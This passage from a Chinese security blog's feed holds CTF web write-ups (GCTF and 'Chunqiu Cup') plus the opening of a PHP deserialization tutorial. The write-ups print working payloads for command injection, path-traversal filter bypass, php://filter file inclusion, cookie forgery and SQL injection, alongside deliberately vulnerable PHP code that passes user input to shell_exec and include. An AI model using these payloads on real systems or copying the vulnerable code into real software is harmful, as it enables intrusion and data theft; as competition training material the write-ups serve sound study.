<p>给出的源码中有一段注释：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">//判断用户权限时会查询priv表，如果为不为TRUE则是管理员权限</div></pre></td></tr></table></figure></p>
<p>所以在执行操作3之前，在这一个空隙里登陆的话，此时会是管理员权限。可以自己写多线程脚本，也可以用burp跑。</p>
<p>reset.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span> :</div><div class="line">	parm = &#123;<span class="string">'name'</span>:<span class="string">'ea2a431e12ec99f7'</span>,<span class="string">'password'</span>:<span class="string">'1111'</span>&#125;</div><div class="line">	cookies = &#123;<span class="string">'PHPSESSID'</span>:<span class="string">'p5gjc6u92u7vc3ugrjnnl86j61'</span>&#125;</div><div class="line">	r = requests.post(<span class="string">'http://218.2.197.242:18009/index.php?method=reset'</span>,cookies=cookies,data=parm)</div><div class="line">	<span class="keyword">print</span> r.text</div></pre></td></tr></table></figure></p>
<p>login.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line">flag = <span class="keyword">False</span></div><div class="line"><span class="keyword">while</span> <span class="keyword">not</span> flag:</div><div class="line">	parm = &#123;<span class="string">'name'</span>:<span class="string">'ea2a431e12ec99f7'</span>,<span class="string">'password'</span>:<span class="string">'1111'</span>&#125;</div><div class="line">	cookies = &#123;<span class="string">'PHPSESSID'</span>:<span class="string">'p5gjc6u92u7vc3ugrjnnl86j61'</span>&#125;</div><div class="line">	r = requests.post(<span class="string">'http://218.2.197.242:18009/login.php?method=login'</span>,cookies=cookies,data=parm)</div><div class="line">	<span class="keyword">print</span> r.text</div><div class="line">	<span class="keyword">if</span> <span class="string">'&#123;'</span> <span class="keyword">in</span> r.text:</div><div class="line">		flag = <span class="keyword">True</span></div><div class="line">		<span class="keyword">break</span></div></pre></td></tr></table></figure></p>
<p>两者分别运行。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170619/7.jpg?raw=true" alt=""></p>
<p>最后flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GCTF&#123;KBnLGG6qR2ZdYe4HbUL8XpAP&#125;</div></pre></td></tr></table></figure></p>
<h1 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h1><p>题目地址：<a href="http://218.2.197.232:18008/" target="_blank" rel="external">http://218.2.197.232:18008/</a><br>访问后查看源代码，如下：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170619/8.jpg?raw=true" alt=""></p>
<p>若访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.2.197.232:18008/a/down.php?p=1.txt</div></pre></td></tr></table></figure></p>
<p>同样可以正常读取，可以猜测过滤了关键字：<code>./</code></p>
<p>若将1.txt改为flag.php，访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://218.2.197.232:18008/a/down.php</div><div class="line">?p=./flag.php</div></pre></td></tr></table></figure></p>
<p>则返回页面提示 waf，所以flag被waf了。</p>
<p>结合<code>flag</code>和<code>./</code>，同时我们知道flag在根目录下，而down在文件夹a下，应该要往回访问。构造下述链接：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.2.197.232:18008/a/down.php?p=...//fl./ag.php</div></pre></td></tr></table></figure></p>
<p><code>...//fl./ag.php</code>中，<code>./</code>被过滤后会变成<code>../flag.php</code>，这样就能成功读取了。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170619/9.jpg?raw=true" alt=""></p>
<p>最后flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GCTF&#123;drthSDFSDGFSdsfhfg&#125;</div></pre></td></tr></table></figure></p>
<h1 id="RCE绕过"><a href="#RCE绕过" class="headerlink" title="RCE绕过"></a>RCE绕过</h1><p>题目地址：<a href="http://218.2.197.232:18006/" target="_blank" rel="external">http://218.2.197.232:18006/</a><br>有点类似“春秋杯”的web。<br>构造如下payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://218.2.197.232:18006/</div><div class="line">?cmd=%0acat%09</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170624/1.jpg?raw=true" alt=""></p>
<h1 id="Forbidden"><a href="#Forbidden" class="headerlink" title="Forbidden"></a>Forbidden</h1><p>题目地址：<a href="http://218.2.197.232:18002/" target="_blank" rel="external">http://218.2.197.232:18002/</a></p>
<p>访问得到forbidden，但返回头为200，所以是个人为写的页面。查看源代码下拉得到提示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!--只允许本机访问。 --&gt;</div></pre></td></tr></table></figure></p>
<p>在请求包中添加：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">X-Forwarded-For:localhost</div></pre></td></tr></table></figure></p>
<p>得到下一个提示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!--只能通过域名访问 --&gt;</div></pre></td></tr></table></figure></p>
<p>在请求包中继续添加：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Host:www.topsec.com</div></pre></td></tr></table></figure></p>
<p>得到下一个提示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!--只允许从百度跳转到本页面访问。 --&gt;</div></pre></td></tr></table></figure></p>
<p>在请求包中继续添加：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Referer:www.baidu.com</div></pre></td></tr></table></figure></p>
<p>得到下一个提示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!--只允许使用ajax访问本页面 --&gt;</div></pre></td></tr></table></figure></p>
<p>在请求包中继续添加：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">X-Requested-With:XMLHttpRequest</div></pre></td></tr></table></figure></p>
<p>得到下一个提示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!--本站只允许使用IE4访问 --&gt;</div></pre></td></tr></table></figure></p>
<p>在网上查一查，将userAgent修改如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">User-Agent: Mozilla/4.0 (compatible; MSIE 4.0; Windows 98)</div></pre></td></tr></table></figure></p>
<p>得到下一个提示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!--电脑上必须安装有.NET8 --&gt;</div></pre></td></tr></table></figure></p>
<p>修改userAgent如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">User-Agent: Mozilla/4.0 (compatible; MSIE 4.0; Windows 98;.NET CLR 8.0.50727)</div></pre></td></tr></table></figure></p>
<p>得到下一个提示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!--本站只允许德国用户访问。 --&gt;</div></pre></td></tr></table></figure></p>
<p>修改userAgent如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Accept-Language: de-DE</div></pre></td></tr></table></figure></p>
<p>得到下一个提示；<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!--没有登录！ --&gt;</div></pre></td></tr></table></figure></p>
<p>同时返回头中出现了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Set-Cookie: login=4e6a59324d545a6a4e7a4d324e513d3d</div></pre></td></tr></table></figure></p>
<p>探索如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">4e6a59324d545a6a4e7a4d324e513d3d是十六进制编码，</div><div class="line">解码得到： NjY2MTZjNzM2NQ== 猜测是base64加密，</div><div class="line">解码得到： 66616c7365 猜测是十六进制编码，</div><div class="line">解码得到： false</div></pre></td></tr></table></figure></p>
<p>要成功登陆，则login=true<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">true 进行十六进制编码，得到：74727565</div><div class="line">再base64编码，得到：NzQ3Mjc1NjU=</div><div class="line">再十六进制编码，得到：4e7a51334d6a63314e6a553d</div></pre></td></tr></table></figure></p>
<p>在请求包中增加Cookie：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Cookie:login=4e7a51334d6a63314e6a553d</div></pre></td></tr></table></figure></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GCTF&#123;Dt24FbREwYJu7P8ekQHEFknK&#125;</div></pre></td></tr></table></figure></p>
<h1 id="越权注入"><a href="#越权注入" class="headerlink" title="越权注入"></a>越权注入</h1><p>题目地址：<a href="http://218.2.197.232:18014/" target="_blank" rel="external">http://218.2.197.232:18014/</a></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170622/2.jpg?raw=true" alt=""></p>
<p>查看源代码，得到提示，同时可以知道uid默认为500 ：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170622/1.jpg?raw=true" alt=""></p>
<p>抓包改包，试着添加uid参数。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170622/5.jpg?raw=true" alt=""></p>
<p>发现可以成功直接修改uid参数：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170622/6.jpg?raw=true" alt=""></p>
<p>接下来考虑role参数，如果直接添加role参数：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170622/7.jpg?raw=true" alt=""></p>
<p>会被拦截：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170622/8.jpg?raw=true" alt=""></p>
<p>考虑进行注入。经过一番测试，可以知道，如果参数中带有引号，会被拦截，被提示说“未通过mysql_escape_string检查。”</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170622/10.jpg?raw=true" alt=""></p>
<p>若在uid后面加上一个括号，会出现sql报错：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170622/9.jpg?raw=true" alt=""></p>
<p>猜测为update型注入，因为引号被过滤了，所以对admin进行一次hex编码，payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">.....birth=11111111&amp;gender=&amp;uid=0,role=0x61646d696e</div></pre></td></tr></table></figure></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GCTF&#123;9CtyJLHMxkjLUs6qfUM5Cmrb&#125;</div></pre></td></tr></table></figure></p>
<h1 id="web综合"><a href="#web综合" class="headerlink" title="web综合"></a>web综合</h1><p>题目地址：<a href="http://218.2.197.232:18007/" target="_blank" rel="external">http://218.2.197.232:18007/</a></p>
<h1 id="变态验证码"><a href="#变态验证码" class="headerlink" title="变态验证码"></a>变态验证码</h1><p>题目地址： <a href="http://218.2.197.232:18003/" target="_blank" rel="external">http://218.2.197.232:18003/</a></p>
<h1 id="Java序列化"><a href="#Java序列化" class="headerlink" title="Java序列化"></a>Java序列化</h1><p>题目地址： <a href="http://218.2.197.232:18005/ctfobj/" target="_blank" rel="external">http://218.2.197.232:18005/ctfobj/</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;GCTF-web-writeup&lt;br&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>“春秋杯”web-writeup</title>
    <link href="http://yoursite.com/2017/06/18/%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9Dweb-writeup/"/>
    <id>http://yoursite.com/2017/06/18/“春秋杯”web-writeup/</id>
    <published>2017-06-18T10:48:59.000Z</published>
    <updated>2017-06-20T03:29:47.250Z</updated>
    
    <content type="html"><![CDATA[<p>朋友打比赛，向她（对，女字旁的她）要的web题地址。<br><a id="more"></a></p>
<h1 id="WEB-01"><a href="#WEB-01" class="headerlink" title="WEB-01"></a>WEB-01</h1><p>访问，有一张图片。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170618/1.jpg?raw=true" alt=""></p>
<p>查看源代码，发现提示有flag.php。访问后为空白页面。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;img src=&quot;1.jpg&quot; alt=&quot;ͼƬ&quot; /&gt;&lt;!-- flag.php --&gt;</div></pre></td></tr></table></figure></p>
<p>用御剑可以扫出备份文件index.php~，得到源代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"> $a=$_GET[<span class="string">"file"</span>];</div><div class="line"> <span class="keyword">if</span>(!<span class="keyword">isset</span>($a))</div><div class="line"> &#123;</div><div class="line">	 $a=<span class="string">'config'</span>;</div><div class="line"> &#125;</div><div class="line"> @<span class="keyword">include</span>($a.<span class="string">'.php'</span>);</div><div class="line"></div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="'</span>.$img.<span class="string">'" alt="ͼƬ" /&gt;'</span>;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>参数为file，尝试利用php伪协议去读取flag.php。最后payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://XXXXX/index.php?file=php://filter/read=convert.base64-encode/resource=flag</div></pre></td></tr></table></figure></p>
<p>得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">PD9waHANCiRmbGFnPSdmbGFnezM4Y2FjMGU0OTc0ZTBlOTc2MTQ5MDhmOTAxZTQ1ZmUzfSc7DQo/Pg==</div></pre></td></tr></table></figure></p>
<p>base64-decode得到最后flag:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$flag=<span class="string">'flag&#123;38cac0e4974e0e97614908f901e45fe3&#125;'</span>;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<h1 id="WEB-02"><a href="#WEB-02" class="headerlink" title="WEB-02"></a>WEB-02</h1><p>上御剑扫描。发现敏感文件robots.txt。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">User-agent: *</div><div class="line">Disallow:</div><div class="line">Disallow: /images</div><div class="line">Disallow: /js</div><div class="line">Disallow: /css</div></pre></td></tr></table></figure></p>
<p>在js目录下有flag.txt 访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;89a7f0eb82a314e5745ec9bc556d06c5&#125;</div></pre></td></tr></table></figure></p>
<h1 id="WEB-03"><a href="#WEB-03" class="headerlink" title="WEB-03"></a>WEB-03</h1><p>题目给了源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[ <span class="string">'ip'</span> ])) &#123;</div><div class="line">    $target = trim($_REQUEST[ <span class="string">'ip'</span> ]);</div><div class="line">    $substitutions = <span class="keyword">array</span>(</div><div class="line">        <span class="string">'&amp;'</span>  =&gt; <span class="string">''</span>,</div><div class="line">        <span class="string">';'</span>  =&gt; <span class="string">''</span>,</div><div class="line">        <span class="string">'|'</span> =&gt; <span class="string">''</span>,</div><div class="line">        <span class="string">'-'</span>  =&gt; <span class="string">''</span>,</div><div class="line">        <span class="string">'$'</span>  =&gt; <span class="string">''</span>,</div><div class="line">        <span class="string">'('</span>  =&gt; <span class="string">''</span>,</div><div class="line">        <span class="string">')'</span>  =&gt; <span class="string">''</span>,</div><div class="line">        <span class="string">'`'</span>  =&gt; <span class="string">''</span>,</div><div class="line">        <span class="string">'||'</span> =&gt; <span class="string">''</span>,</div><div class="line">    );</div><div class="line">    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );</div><div class="line">    $cmd = shell_exec( <span class="string">'ping  -c 4 '</span> . $target );</div><div class="line">        <span class="keyword">echo</span> $target;</div><div class="line">    <span class="keyword">echo</span>  <span class="string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>;</div><div class="line">&#125;</div><div class="line">show_source(<span class="keyword">__FILE__</span>);</div></pre></td></tr></table></figure></p>
<p>拿DVWA代码改的，简直无力吐槽。</p>
<p>payload1：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://XXXX:83/index.php?ip=127.0.0.1%0als</div></pre></td></tr></table></figure></p>
<p>paylaod2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://XXXX:83/index.php?ip=127.0.0.1%0acat flag.php</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170618/5.jpg?raw=true" alt=""></p>
<h1 id="WEB-04"><a href="#WEB-04" class="headerlink" title="WEB-04"></a>WEB-04</h1><p>题目给了源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_REQUEST[<span class="string">'ip'</span>]) ) &#123;</div><div class="line">   $target = $_REQUEST[ <span class="string">'ip'</span> ];</div><div class="line">   $cmd = shell_exec( <span class="string">'ping  -c 4 '</span> . $target );</div><div class="line">   <span class="keyword">echo</span>  <span class="string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>;</div><div class="line">&#125;</div><div class="line">show_source(<span class="keyword">__FILE__</span>);</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>没任何过滤，payload1：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://XXXX:84/index.php?ip=127.0.0.2 | ls</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170618/2.jpg?raw=true" alt=""></p>
<p>payload2：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://XXXX:84/index.php?ip=127.0.0.1 | cat flag.php</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170618/3.jpg?raw=true" alt=""></p>
<p>flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;19b55155-f84c-47ef-aeaa-038116de31e5&#125;</div></pre></td></tr></table></figure></p>
<h1 id="小扯两句"><a href="#小扯两句" class="headerlink" title="小扯两句"></a>小扯两句</h1><p>好吧，这web题的质量，不敢恭维。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;朋友打比赛，向她（对，女字旁的她）要的web题地址。&lt;br&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>浅谈php反序列化漏洞</title>
    <link href="http://yoursite.com/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2017/06/17/浅谈php反序列化漏洞/</id>
    <published>2017-06-17T04:51:02.000Z</published>
    <updated>2017-06-20T04:38:02.406Z</updated>
    
    <content type="html"><![CDATA[<p>php反序列化漏洞，又叫php对象注入漏洞。<br><a id="more"></a></p>
<h1 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h1><p>php中有两个函数<a href="http://php.net/manual/zh/function.serialize.php" target="_blank" rel="external">serialize()</a> 和<a href="http://php.net/manual/zh/function.unserialize.php" target="_blank" rel="external">unserialize()</a>。</p>
<h2 id="serialize"><a href="#serialize" class="headerlink" title="serialize()"></a>serialize()</h2><p>当在php中创建了一个对象后，可以通过serialize()把这个对象转变成一个字符串，保存对象的值方便之后的传递与使用。测试代码如下；<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">chybeta</span></span>&#123;</div><div class="line">	<span class="keyword">var</span> $test = <span class="string">'123'</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$class1 = <span class="keyword">new</span> chybeta;</div><div class="line">$class1_ser = serialize($class1);</div><div class="line">print_r($class1_ser);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>这边我们创建了一个新的对象，并且将其序列化后的结果打印出来：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O:7:&quot;chybeta&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;123&quot;;&#125;</div></pre></td></tr></table></figure></p>
<p>这里的<code>O</code>代表存储的是对象（object）,假如你给serialize()传入的是一个数组，那它会变成字母a。<code>7</code>表示对象的名称有7个字符。<code>&quot;chybeta&quot;</code>表示对象的名称。<code>1</code>表示有一个值。<code>{s:4:&quot;test&quot;;s:3:&quot;123&quot;;}</code>中，<code>s</code>表示字符串，<code>4</code>表示该字符串的长度，<code>&quot;test&quot;</code>为字符串的名称，之后的类似。</p>
<h2 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize()"></a>unserialize()</h2><p>与 serialize() 对应的，unserialize()可以从已存储的表示中创建PHP的值，单就本次所关心的环境而言，可以从序列化后的结果中恢复对象（object）。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">chybeta</span></span>&#123;</div><div class="line">	<span class="keyword">var</span> $test = <span class="string">'123'</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$class2 = <span class="string">'O:7:"chybeta":1:&#123;s:4:"test";s:3:"123";&#125;'</span>;	print_r($class2);</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</div><div class="line"></div><div class="line">$class2_unser = unserialize($class2);</div><div class="line">print_r($class2_ser);</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170617/1.jpg?raw=true" alt=""></p>
<p>这里提醒一下，当使用 unserialize() 恢复对象时， 将调用 __wakeup() 成员函数。</p>
<h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><p>由前面可以看出，当传给 unserialize() 的参数可控时，我们可以通过传入一个精心构造的序列化字符串，从而控制对象内部的变量甚至是函数。</p>
<h2 id="利用构造函数等"><a href="#利用构造函数等" class="headerlink" title="利用构造函数等"></a>利用构造函数等</h2><h3 id="Magic-function"><a href="#Magic-function" class="headerlink" title="Magic function"></a>Magic function</h3><p>php中有一类特殊的方法叫“<a href="https://secure.php.net/manual/zh/language.oop5.magic.php" target="_blank" rel="external">Magic function</a>”， 这里我们着重关注一下几个：</p>
<ul>
<li>构造函数__construct()：当对象创建(new)时会自动调用。但在unserialize()时是不会自动调用的。</li>
<li>析构函数__destruct()：当对象被销毁时会自动调用。</li>
<li>__wakeup() ：如前所提，unserialize()时会自动调用。</li>
</ul>
<p>测试如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">chybeta</span></span>&#123;</div><div class="line">	<span class="keyword">var</span> $test = <span class="string">'123'</span>;</div><div class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</div><div class="line">		<span class="keyword">echo</span> <span class="string">"__wakeup"</span>;</div><div class="line">		<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</div><div class="line">		<span class="keyword">echo</span> <span class="string">"__construct"</span>;</div><div class="line">		<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</div><div class="line">		<span class="keyword">echo</span> <span class="string">"__destruct"</span>;</div><div class="line">		<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line">$class2 = <span class="string">'O:7:"chybeta":1:&#123;s:4:"test";s:3:"123";&#125;'</span>;</div><div class="line">	print_r($class2);</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</div><div class="line"></div><div class="line">$class2_unser = unserialize($class2);</div><div class="line">print_r($class2_unser);</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170617/2.jpg?raw=true" alt=""></p>
